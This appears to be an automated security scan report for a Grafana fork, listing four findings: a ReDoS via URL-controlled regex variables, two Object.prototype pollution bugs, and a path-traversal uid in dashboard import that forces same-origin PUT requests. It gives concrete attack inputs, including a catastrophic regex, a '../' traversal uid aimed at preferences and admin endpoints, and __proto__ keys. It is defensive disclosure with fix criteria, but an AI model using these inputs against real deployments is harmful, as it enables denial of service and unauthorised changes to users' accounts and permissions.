**CWE:** [CWE-212](https://cwe.mitre.org/data/definitions/212.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256257

---

# Template-variable interpolation turns URL-controlled values into transformation regexes (ReDoS)

## Details
Dashboard transformations run in every viewer's browser on every datasource response. Before a transformation executes, every string in its options is template-variable interpolated: the legacy runner passes ctx.interpolate = templateSrv.replace (PanelQueryRunner.ts:231) and @grafana/data transformDataFrame deep-iterates the options calling ctx.interpolate on each string (recovered from public/build/6540.a30454ce5fbe65a84f5f.js.map, packages/grafana-data/src/transformations/transformDataFrame.ts lines 62-75); in Scenes, SceneDataTransformer._interpolateVariablesInTransformationConfigs interpolates JSON.stringify(transformations) (public/build/7606.e8e4d98948a4bb1cf3bc.js.map). The default Glob format returns String(value) unescaped (formatVariableValue.ts:29-31; scenes formatRegistry Glob formatter).

Variable values are attacker-controlled: any var-<name>= URL parameter sets them; scenes keeps URL values that are not in the option list through initial validation (MultiValueVariable.updateFromUrl sets skipNextValidation; interceptStateUpdateAfterValidation preserves the value); textbox variables accept anything; and a query variable's first option (selected when the saved value is invalid) comes from the datasource.

Several transformers compile these interpolated strings as regular expressions with no length/complexity bound and evaluate them against datasource data per row or per field:
- extractFields RegExp extractor: stringToJsRegex(options.regExp) then v.match(regex) on every row value (fieldExtractors.ts:24-37).
- filterByValue regex matcher: new RegExp(options.value) tested on every row (@grafana/data regexMatchers.ts:12). Its editor RegexMatcherEditor offers plain $var suggestions for this field and uses validator: () => true (RegexMatcherEditor.tsx:19-31, 56-65).
- filterFieldsByName include.pattern and renameByRegex regex: stringToJsRegex against every field display name (@grafana/data nameMatcher.ts:196-207, renameByRegex.ts:51-57). Their editors validate only the un-interpolated author string (FilterByNameTransformerEditor.tsx:150-175, RenameByRegexTransformer.tsx:8-17).

The in-product documentation for Filter fields by name instructs authors that "The regular expression can include an interpolated dashboard variable by using the ${variableName} syntax" (docs/content.ts:471), so the precondition is a documented authoring pattern.

Attack: a dashboard uses /$pattern.*/ (or $pattern) in one of these options. An unauthenticated attacker sends a viewer a link /d/<uid>?var-pattern=(.*a){20}(.*a){20}$ (any catastrophic pattern). On load the regex is compiled and run against every field name or every row value of the panel data; backtracking is exponential in input length, so the main thread blocks for minutes or indefinitely and the tab must be killed. In Scenes, because interpolation is performed on the JSON text, a value containing a double quote can additionally inject further option keys into the same transformation object. A malicious datasource reaches the same sink with no link by returning a catastrophic string as the first option of a query variable referenced in the regex.

Assumptions on uninstalled dependencies (stated from recovered sources): @grafana/data transformDataFrame/stringToJsRegex/regexMatchers behave as in the 6540 source map; @grafana/scenes SceneDataTransformer, MultiValueVariable and the Glob formatter behave as in the 7606 source map.

## Evidence
1. [public/app/features/transformers/extractFields/fieldExtractors.ts:24–37](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/extractFields/fieldExtractors.ts#L24-L37)
   RegExp extractor compiles the already variable-interpolated options.regExp with stringToJsRegex (no length or complexity bound) and runs v.match(regex) on every string row value of the source field (addExtractedFields loop in extractFields.ts).
2. [public/app/features/dashboard-scene/utils/createPanelDataProvider.ts:40–43](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/utils/createPanelDataProvider.ts#L40-L43)
   Production Scenes dashboard runtime wraps every panel's saved transformations in SceneDataTransformer; the recovered @grafana/scenes SceneDataTransformer._interpolateVariablesInTransformationConfigs runs JSON.parse(sceneGraph.interpolate(JSON.stringify(transformations))) with the default Glob format, so URL variable values land verbatim in every string option, including regex options.
3. [public/app/features/query/state/PanelQueryRunner.ts:230–232](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/query/state/PanelQueryRunner.ts#L230-L232)
   Legacy runner wires ctx.interpolate to templateSrv.replace; recovered @grafana/data transformDataFrame deep-iterates the options and calls ctx.interpolate on every string outside Scenes.
4. [public/app/features/templating/formatVariableValue.ts:29–31](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/templating/formatVariableValue.ts#L29-L31)
   With no explicit format the Glob formatter is used; for a single value it returns String(value) unescaped, so regex metacharacters from the URL value survive into the pattern.
5. [public/app/features/dashboard-scene/utils/variables.ts:337–349](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/utils/variables.ts#L337-L349)
   Dashboard 'textbox' variables become scenes TextBoxVariable objects whose updateFromUrl accepts any string under var-<name>, so a link alone sets the value that is interpolated into the regex.
6. [public/app/features/transformers/FilterByValueTransformer/ValueMatchers/RegexMatcherEditor.tsx:19–31](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/FilterByValueTransformer/ValueMatchers/RegexMatcherEditor.tsx#L19-L31)
   Editor offers plain $var (and $var:regex) suggestions for the regex matcher value, steering authors to put variables into the pattern that @grafana/data regexMatchers compiles with new RegExp(options.value) and tests per row.
7. [public/app/features/transformers/FilterByValueTransformer/ValueMatchers/RegexMatcherEditor.tsx:56–65](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/FilterByValueTransformer/ValueMatchers/RegexMatcherEditor.tsx#L56-L65)
   validator: () => true — no constraint on the regex option even at author time.
8. [public/app/features/transformers/editors/FilterByNameTransformerEditor.tsx:150–175](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/editors/FilterByNameTransformerEditor.tsx#L150-L175)
   Author-time validation compiles only the literal author string with $var unexpanded; the interpolated runtime pattern (byRegexp field matcher via stringToJsRegex against every field display name) is never validated.
9. [public/app/features/transformers/editors/RenameByRegexTransformer.tsx:8–17](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/editors/RenameByRegexTransformer.tsx#L8-L17)
   Same author-time-only validation for renameByRegex; the interpolated pattern is compiled by @grafana/data renameByRegex.ts (stringToJsRegex) and tested/replaced against every field display name.
10. [public/app/features/transformers/docs/content.ts:471](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/docs/content.ts#L471)
   Shipped in-product documentation tells authors to embed ${variableName} in the Filter-by-name regex, making the vulnerable configuration a documented authoring pattern rather than a misconfiguration.

## Impact
Denial of service of the victim's browser session: catastrophic backtracking blocks the Grafana tab's main thread while the panel data is processed and the tab must be killed. No data is read or modified; the server and other sessions are unaffected and the victim recovers by closing the tab and reopening without the parameter, so availability is rated LOW (in line with the verified sibling panel-search-variable-regex-redos). The datasource-supplied variant hits every viewer of that dashboard on load but is still confined to those clients.

## Reproduction steps
1. An unauthenticated attacker crafts /d/<uid>?var-<name>=<catastrophic pattern> and gets a user who can view the dashboard to open it (phishing, chat, link in another dashboard); scenes TextBoxVariable.updateFromUrl stores the string, SceneDataTransformer interpolates it unescaped (Glob) into the transformation options, and the regex is compiled and run per row or per field name on the panel data, blocking the main thread. The same sink is reached without a link by a malicious datasource that returns a catastrophic string as the first option of a query variable used in the pattern. Requirement: the dashboard references a textbox/query variable inside a regex-typed transformation option (extractFields RegExp, filterByValue regex, filterFieldsByName pattern, renameByRegex), which the editors' variable suggestions and docs/content.ts:471 encourage but which the attacker does not control (AT:P). No privileges needed beyond the victim's; victim only opens the link (UI:P). Assumes the browser regex engine is backtracking without a step limit (V8 irregexp / SpiderMonkey defaults) and that @grafana/data and @grafana/scenes behave as recovered from the shipped source maps (public/build/6540.a30454ce5fbe65a84f5f.js.map, 7606.e8e4d98948a4bb1cf3bc.js.map).

## Recommended fix
1. Interpolated template-variable values are inserted verbatim into strings that are then compiled as regular expressions, so an untrusted URL/datasource value controls regex syntax. Fix criteria: A variable value expanded into a transformation regex option must not be able to change regex structure unless the author explicitly requested regex formatting (e.g. the value is regex-escaped by default, or only ${var:regex} is honoured). Verify that var-x=(.*a){20}(.*a){20}$ in the URL produces a literal match or a rejected pattern rather than a hang.
2. Regex compile sites (extractFields RegExp extractor, filterByValue regex matcher, filterFieldsByName/renameByRegex patterns) accept arbitrary patterns of unbounded complexity and run them per row/field. Fix criteria: Patterns are checked for super-linear backtracking (or input/pattern length is bounded) before being applied to data, and failures degrade to a panel error instead of blocking the UI thread; a catastrophic pattern applied to a 10k-row frame completes in bounded time.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256256

---

# Filter-by-name editor writes Object.prototype.count via datasource field named __proto__

## Details
FilterByNameTransformerEditor.initOptions indexes the incoming frames' fields in a prototype-bearing plain object keyed by their display name: `const byName: KeyValue<FieldNameInfo> = {}; let v = byName[displayName]; if (!v) { v = byName[displayName] = { name, count: 0 }; allNames.push(v); } v.count++` (public/app/features/transformers/editors/FilterByNameTransformerEditor.tsx:68-84).

The key is datasource-controlled: the recovered @grafana/data getFieldDisplayName (packages/grafana-data/src/field/fieldState.ts) returns `field.name` verbatim for a plain frame, or `field.config.displayName` / `displayNameFromDS` when the datasource sets them. Nothing in the frontend source filters `__proto__`/`constructor` keys or freezes Object.prototype. When a field's display name is `__proto__`, `byName['__proto__']` resolves through the prototype chain to Object.prototype, which is truthy, so the create branch is skipped and `v.count++` executes against Object.prototype, creating an own, enumerable property `Object.prototype.count = NaN` (undefined++). A field named `constructor` likewise sets `Object.count = NaN`.

The write needs no user action beyond opening the editor: componentDidMount/componentDidUpdate call initOptions (lines 50-58); TransformationEditor.tsx:42-45 mounts the registered editor (standardTransformers.tsx:159) with `input` = the panel's query result frames, and TransformationOperationRow.tsx:222-255 renders it inside a QueryOperationRow with no isOpen prop, which defaults to expanded. The pollution persists for the SPA session.

Impact is limited: only the fixed property name `count` (value NaN) is injected. It is nonetheless observable: every object now reports `count === NaN` and enumerates `count` in for-in, so e.g. search/service/unified.ts:167 and :229 (`meta.count ?? first.length`) yield NaN totals instead of the fallback, and TagOption.tsx:26 (`data.count ?? 0`) renders NaN badges. No code-execution or data-exposure gadget keyed on `count` was found, so this is a low-integrity prototype-pollution defect. Other data-name-keyed plain-object lookups in the transformers unit (FilterByValueTransformerEditor.fieldByDisplayName, CalculateFieldTransformerEditor.byName, fieldToConfigMapping, timeSeriesTable refId maps, joinByLabels) only assign primitives or re-parent local objects and do not mutate Object.prototype.

## Evidence
1. [public/app/features/transformers/editors/FilterByNameTransformerEditor.tsx:68–84](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/editors/FilterByNameTransformerEditor.tsx#L68-L84)
   Plain-object dictionary keyed by the datasource-controlled display name; for `__proto__` the lookup returns Object.prototype (truthy), the create branch is skipped, and `v.count++` writes Object.prototype.count = NaN. This is the code the fix must change.
2. [public/app/features/transformers/editors/FilterByNameTransformerEditor.tsx:50–58](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/editors/FilterByNameTransformerEditor.tsx#L50-L58)
   initOptions runs on mount and whenever `input` changes, so the write is triggered by merely rendering the editor with the malicious frames.
3. [public/app/features/dashboard/components/TransformationsEditor/TransformationEditor.tsx:42–51](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/components/TransformationsEditor/TransformationEditor.tsx#L42-L51)
   Mounts the registered transformer editor via createElement with `input` = the panel's (transformed) query result frames, i.e. datasource output reaches the editor unfiltered.
4. [public/app/features/dashboard/components/TransformationsEditor/TransformationOperationRow.tsx:222–255](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/components/TransformationsEditor/TransformationOperationRow.tsx#L222-L255)
   Renders TransformationEditor inside a QueryOperationRow without an isOpen prop; QueryOperationRow defaults to expanded, so the editor mounts as soon as the Transform tab shows the row.
5. [public/app/features/transformers/standardTransformers.tsx:159–160](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/transformers/standardTransformers.tsx#L159-L160)
   The Filter-by-name editor is registered in the standard transformer registry shipped with every dashboard panel editor.
6. [public/app/features/search/service/unified.ts:167](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/search/service/unified.ts#L167)
   Downstream consumer: `customMeta?.count ?? first.length` — with Object.prototype.count = NaN the nullish fallback is skipped and the search hit count becomes NaN, a concrete (low) integrity effect of the pollution.

## Impact
A single fixed property (count = NaN, enumerable) is injected into Object.prototype of the Editor's page for the rest of the SPA session. Observable consequences are corrupted values where code relies on `count` being absent (nullish fallbacks in search/service/unified.ts:167/229 and TagOption.tsx:26 yield NaN) and `count` appearing in every for-in enumeration. No confidentiality or availability effect and no gadget keyed on `count` was traced, so integrity impact is LOW.

## Reproduction steps
1. A malicious or compromised datasource (threat-model adversary 4) returns a frame containing a field whose name, config.displayName or displayNameFromDS is `__proto__`; a SQL-type datasource reaches the same state from a column alias. An Editor whose panel queries that datasource opens the panel editor's Transform tab containing a Filter-fields-by-name transformation; the editor mounts expanded and initOptions increments `count` on Object.prototype. Requires the datasource to be configured and used by a panel (AT:PRESENT) and the victim's editing action (UI:ACTIVE); the datasource needs no Grafana privileges (PR:NONE).

## Recommended fix
A prototype-bearing plain object is used as a dictionary keyed by untrusted field names, and the looked-up value is mutated. Fix criteria: Field-name indexes built from data use a Map or a null-prototype object (or an own-property check) so that a field named __proto__/constructor cannot resolve to a prototype object; verify Object.prototype.count remains undefined after opening the editor on such a frame.

---
**Severity:** LOW
**Status:** Open
**Category:** Prototype pollution
**CWE:** [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256255

---

# Dashboard import interpolates attacker-supplied uid into PUT path, enabling forced same-origin requests

## Details
The dashboard import page (/dashboard/import, routes.tsx:144-147 -> DashboardImportPage -> DashboardImportK8s; no feature flag, no frontend role gate) takes a dashboard JSON from a dropped file, a pasted string, or grafana.com (the typed id/URL form or, automatically on mount, the `?gcomDashboardId=` query parameter — DashboardImportK8s.tsx:50-57). Any JSON with a `title` key is treated as a V1 spec (utils.ts:48-50) and rendered by ImportOverviewV1, whose Form uses `defaultValues={{ ...dashboard }}` (ImportOverviewV1.tsx:109), so `form.uid` is the JSON's `uid` verbatim. It is shown in a natively `disabled` input (ImportForm.tsx:110-115) — the bundled react-hook-form only strips fields registered with the `disabled` *option*, which this field is not, so handleSubmit submits `_formValues.uid` unchanged. On submit applyV1Inputs writes it back as `dashboard.uid` (inputs.ts:507); K8sDashboardAPI.saveDashboard sets `obj.metadata.name = dashboard.uid` and calls `client.update(obj, { fieldValidation: 'Ignore' })` (v1.ts:98-102), which is `getBackendSrv().put(`${this.url}/${name}`, obj, { params })` (apiserver/client.ts:153-160). The uid is never validated against the dashboard-uid grammar nor URL-encoded anywhere in the chain: ImportForm registers it with only `trim`; backend_srv.put/request do not set `validatePath`; parseRequestOptions (backend_srv.ts:294-327) only strips the leading '/'; fetch.ts parseUrlFromOptions (179-192) applies validatePath only when the option is set.

`this.url` is `/apis/dashboard.grafana.app/<v1 version>/namespaces/<ns>/dashboards` — six path segments (getAPINamespace from @grafana/api-clients, not in checkout, is assumed to return a single segment such as `default`). The browser's fetch() resolves the relative URL against `<base href="[[.AppSubUrl]]/">` (public/views/index.html:15) with WHATWG dot-segment removal, so a uid of `../../../../../../api/user/preferences` (six `..`; more are harmless when Grafana is served at the origin root, exactly six keeps the result under a sub-path) turns the save into `PUT <appSubUrl>/api/user/preferences?fieldValidation=Ignore`, sent with the victim's grafana_session cookie, X-Grafana-Org-Id, a same-origin Origin header (so the server's origin-based CSRF middleware — backend not in checkout, assumed — accepts it) and `content-type: application/json` (fetch.ts putHeaderParser). The V2 path (ImportOverviewV2 -> K8sDashboardV2API.saveDashboard, v2.ts:158-162) has the identical sink via `k8s.name`.

The forged body is fixed in shape — `{metadata:{name,annotations}, spec:{<imported dashboard>}}` — so legacy `/api/*` PUT handlers (Go encoding/json via web.Bind, unknown fields ignored — assumption, backend not in checkout) see an all-zero command. From public/api-merged.json the reachable PUT handlers whose zero value is meaningful include: `/api/user/preferences` (any victim: theme, home dashboard, timezone, language, nav/query-history prefs wiped), `/api/org/preferences` and `/api/teams/{id}/preferences` (Org Admin victim), `/api/admin/users/{id}/permissions` (Server Admin victim; `isGrafanaAdmin` absent -> false, stripping another account's server-admin flag — the spec marks the field optional), `/api/teams/{id}/members` (SetTeamMembershipsCommand with nil members/admins), `/api/orgs/{id}/quotas/{target}` and `/api/admin/users/{id}/quotas/{target}` (limit 0 when quotas are enabled), and enterprise `/api/access-control/users/{id}/roles` (clear RBAC assignments). k8s `/apis/...` targets are not reachable because the body's metadata.name (the traversal string) would not match the URL name (apiserver convention, assumed).

The pre-save `validateUid` check (validation.ts:54-75, triggered on mount via validateFieldsOnMount) GETs the same traversed path with `/dto` appended (v1.ts:144 subresource); the resulting 404 makes it return `true` with `isHandled` set, so no toast appears and the victim sees the ordinary primary 'Import' button rather than the destructive 'Import (Overwrite)' warning. Even if validation produced an error, ImportForm.tsx:53-57 force-submits on click. The follow-up `asSaveDashboardResponseDTO` throws on the non-dashboard response and surfaces 'Dashboard import failed', but the state-changing PUT has already completed.

Attack: an attacker with no Grafana account publishes a dashboard on grafana.com whose `uid` is the traversal string and sends a victim `https://<grafana>/dashboard/import?gcomDashboardId=<id>` (this delivery holds if grafana.com preserves the published uid — not verifiable here), or distributes the JSON file / snippet for the victim to upload or paste — the ordinary way community dashboards are shared, requiring no condition. The victim (any user allowed to create dashboards, Editor by default) opens the prefilled form and clicks Import. Same-source siblings with no state change (GET only): `getLibraryPanel(uid)` for `__elements` uids and the `/api/gnet/dashboards/${id}` fetch from `?gcomDashboardId=`.

This is the same weakness class as live-panel-influx-publish-path-injection-forced-post (unvalidated segment -> backendSrv -> fetch dot-segment resolution) at a different source and sink, reachable in default configuration.

## Evidence
1. [public/app/features/dashboard/api/v1.ts:98–102](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/api/v1.ts#L98-L102)
   K8sDashboardAPI.saveDashboard: when the dashboard has a uid it sets obj.metadata.name = dashboard.uid and calls this.client.update(obj, { fieldValidation: 'Ignore' }). In the import flow the uid is the value taken from the imported JSON (prefilled, disabled input), never validated against the uid grammar.
2. [public/app/features/apiserver/client.ts:153–159](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/apiserver/client.ts#L153-L159)
   ScopedResourceClient.update issues getBackendSrv().put(`${this.url}/${name}`, obj, { params }) with the raw metadata.name string; no encodeURIComponent, no validatePath. this.url has six segments (/apis/<group>/<version>/namespaces/<ns>/<resource>), so a name such as ../../../../../../api/user/preferences is resolved by WHATWG dot-segment removal in the browser's fetch() to PUT <appSubUrl>/api/user/preferences.
3. [public/app/features/manage-dashboards/import/components/ImportOverviewV1.tsx:40–94](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/manage-dashboards/import/components/ImportOverviewV1.tsx#L40-L94)
   onSubmit builds the save command from the imported dashboard (applyV1Inputs -> uid: form.uid) and calls getDashboardAPI('v1').saveDashboard(). form.uid defaults to the imported JSON's uid (Form defaultValues = {...dashboard}). asSaveDashboardResponseDTO then throws on the non-dashboard response, but the PUT has already been sent.
4. [public/app/features/manage-dashboards/import/utils/inputs.ts:498–507](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/manage-dashboards/import/utils/inputs.ts#L498-L507)
   applyV1Inputs copies form.uid (the imported uid) onto the dashboard that is saved, so the attacker-chosen string becomes dashboard.uid and hence metadata.name / the PUT path segment.
5. [public/app/features/manage-dashboards/import/components/ImportForm.tsx:108–133](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/manage-dashboards/import/components/ImportForm.tsx#L108-L133)
   The uid field is registered with only setValueAs trim and validate: validateUid. There is no pattern/length check (the backend grammar is [a-zA-Z0-9_-]{1,40}); the input is disabled by default so the imported value is used unless the victim clicks 'Change uid'.
6. [public/app/features/manage-dashboards/import/utils/validation.ts:54–74](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/manage-dashboards/import/utils/validation.ts#L54-L74)
   validateUid GETs api.getDashboardDTO(uid) — itself a traversal-able GET `${url}/${uid}/dto` — and on any non-403 error (404 for the forged path) returns true, so the victim sees the normal 'Import' button, not the destructive 'Import (Overwrite)' warning.
7. [public/app/features/manage-dashboards/import/components/DashboardImportK8s.tsx:50–56](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/manage-dashboards/import/components/DashboardImportK8s.tsx#L50-L56)
   A ?gcomDashboardId= query parameter auto-fetches /api/gnet/dashboards/<id> on mount and loads that grafana.com-published JSON straight into the import form, giving an unauthenticated attacker a one-link delivery path; handleFileUpload/handleJsonPaste (87-114) accept arbitrary JSON files/paste as the other delivery paths. The id itself is also interpolated unvalidated (the typed-form path applies a regex, this path does not).
8. [public/app/features/dashboard/api/v2.ts:158–162](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/api/v2.ts#L158-L162)
   K8sDashboardV2API.saveDashboard has the same sink: if obj.metadata.name is set (ImportOverviewV2 defaults k8s.name to the imported resource's metadata.name) it calls client.update -> PUT `${url}/${name}`.
9. [public/app/core/services/backend\_srv.ts:608–610](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/backend_srv.ts#L608-L610)
   put() forwards to request() without validatePath; parseRequestOptions (294-327) only strips a leading '/' and adds X-Grafana-Org-Id, so the dot-segments survive to fetch().
10. [public/app/core/utils/fetch.ts:179–191](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/fetch.ts#L179-L191)
   parseUrlFromOptions applies validatePath only when options.validatePath is true (only getLibraryPanelByName sets it); otherwise the raw path with ../ segments is handed to fetch(), which resolves them against <base href>.

## Impact
The attacker chooses the endpoint but the JSON body is fixed in shape ({metadata,spec}), so legacy PUT handlers receive zero-valued commands: the victim's (or org's) preferences are wiped, team membership/RBAC role assignments cleared, quotas zeroed, or — if the victim is a Server Admin — another account's server-admin flag removed via /api/admin/users/{id}/permissions. These are real, attacker-selected modifications of restricted state, but with limited control over the written values (integrity LOW). The response is not readable (confidentiality NONE); no direct availability impact.

## Reproduction steps
1. Attacker needs no Grafana privileges: they craft a dashboard JSON whose uid contains dot-segments and deliver it as a grafana.com dashboard (one-click `?gcomDashboardId=` link auto-loads it), or as a file/paste. The victim — any authenticated user who may import dashboards — opens the prefilled form and clicks Import (UI:A). No defensive mechanism stands in the way (AC:L): validateUid swallows the 404 and shows the normal Import button, backendSrv/fetch pass dot-segments through, and the browser sends the victim's session cookie with a same-origin Origin header. Works on a default deployment (AT:N); the consequence depends on which PUT endpoint the victim's role may call.

## Recommended fix
1. The import flow accepts the uid from untrusted dashboard JSON and passes it unvalidated into K8sDashboardAPI/K8sDashboardV2API.saveDashboard, which uses it as metadata.name and hence as a raw path segment of a PUT request. Fix criteria: Before any request is issued, the imported uid (and V2 metadata.name) must be validated against the dashboard uid grammar (ASCII alphanumerics, '-' and '_', max 40 chars) and rejected otherwise; verification: importing JSON with uid `../../../../../api/user/preferences` produces a form validation error and no PUT/GET leaves the browser.
2. ScopedResourceClient builds `${this.url}/${name}` (get, subresource, update, delete) without encoding or validating the resource name, so any caller that forwards untrusted names can redirect the request. Fix criteria: Resource names must be URL-encoded (encodeURIComponent) or validated as a single k8s name segment when composing the path, or the request must set validatePath: true; verification: a name containing '/', '.', '?' or '#' can never change the resolved endpoint away from /apis/<group>/<version>/namespaces/<ns>/<resource>/<name>.

---
**Severity:** LOW
**Status:** Open
**Category:** Cross-site request forgery
**CWE:** [CWE-99](https://cwe.mitre.org/data/definitions/99.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256254

---

# Explore URL panelsState.logs.columns pollutes Object.prototype via LogsTableWrap column restore

## Details
Explore restores per-visualisation state from the `panes` URL parameter. `v1Migrator.applyDefaults` (hooks/useStateSync/migrators/v1.ts:110-112) accepts any object as `panelsState`, and `init.ts` -> `initializeExplore` -> `changePanelsStateAction` dispatch it unchanged into the pane store, so `panelsState.logs.columns` and `panelsState.logs.visualisationType` are controlled by whoever authors a `/explore?schemaVersion=1&panes=...` link.

When `visualisationType` is `"table"`, the query returns log rows, and the `logsTablePanelNG` flag is at its default `false`, `Logs.tsx` renders `ControlledLogRows` -> `ControlledLogsTable` -> `LogsTableWrap` with `panelState = panelsState.logs`. On each result, `LogsTableWrap` builds `pendingLabelState` as a plain object and calls `getColumnsFromProps`:

```ts
Object.values(previouslySelected).forEach((key, index) => {
  if (fieldNames[key]) {
    fieldNames[key].active = true;
    fieldNames[key].index = index;
  }
});
```

`previouslySelected` is the URL `columns` value. With `columns: ["__proto__"]` (or `{"0":"__proto__"}`), `fieldNames["__proto__"]` is `Object.prototype` (truthy), so the code writes `Object.prototype.active = true` and `Object.prototype.index = <position of "__proto__" in the attacker's list>` — the attacker chooses the integer by padding the array. `"constructor"` likewise writes `active`/`index` onto the global `Object` function. Nothing on the path (`columnsMigration.ts`, `changePanelState`) filters the keys and there is no `Object.hasOwn` guard.

Consequences in the victim's tab for the rest of the session (the SPA never reloads): every object inherits enumerable `active === true` and `index === k`. Confirmed gadgets in this tree: `logFrameLabelsToLabels` (features/logs/logsFrame.ts:43-60) iterates labels with `for…in` and so attaches phantom labels `active="true"` / `index="k"` to every log line and label-driven control; `queryIsEmpty` (core/utils/query.ts:7) sees the inherited keys and reports every query non-empty; nav/breadcrumb code (`Breadcrumbs/utils.ts:37`, `AppChromeService.tsx:267`) treats every nav child as active; and the heatmap renderer (`plugins/panel/heatmap/utils.ts:631`) takes `disp.fill.index` as its palette and throws on `fillPalette.map`, breaking heatmap panels. The attacker cannot choose property names or arbitrary values, so impact is bounded to integrity and availability of the victim's client session, not code execution or data disclosure.

Preconditions: the victim is signed in with Explore access and the link names (by name or uid) a datasource that returns log rows for the attacker's query, or the victim's last-used/default datasource does. The attacker needs no account.

## Evidence
1. [public/app/features/explore/Logs/LogsTableWrap.tsx:87–100](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/Logs/LogsTableWrap.tsx#L87-L100)
   getColumnsFromProps iterates Object.values(props.panelState.columns) — strings taken from the URL — and for each does `if (fieldNames[key]) { fieldNames[key].active = true; fieldNames[key].index = index; }`. fieldNames is a plain object (`{}` or Object.fromEntries), so key '__proto__' resolves to Object.prototype (truthy) and both assignments land on Object.prototype; key 'constructor' resolves to the global Object function. No Object.hasOwn / allow-list guard exists. This is the line the fix must change.
